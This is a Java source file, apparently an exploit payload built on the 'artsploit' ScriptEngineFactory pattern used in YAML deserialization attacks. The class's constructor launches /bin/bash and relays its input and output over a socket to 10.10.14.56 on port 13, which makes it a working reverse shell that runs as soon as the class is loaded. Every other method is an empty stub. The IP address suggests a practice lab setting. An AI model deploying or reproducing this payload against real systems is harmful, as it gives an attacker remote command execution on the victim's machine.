package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {            
    String host="10.10.14.56";
    int port=13;
    String cmd="/bin/bash";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
    Socket s=new Socket(host,port);
    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
    OutputStream po=p.getOutputStream(),so=s.getOutputStream();
    while(!s.isClosed()) {
      while(pi.available()>0)
        so.write(pi.read());
      while(pe.available()>0)
        so.write(pe.read());
      while(si.available()>0)
        po.write(si.read());
      so.flush();
      po.flush();
      try {
      Thread.sleep(50);
} catch(InterruptedException ex) {
    Thread.currentThread().interrupt();
}
      try {
        p.exitValue();
        break;
      }
      catch (Exception e){
      }
    };
    p.destroy();
    s.close();
            

            
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}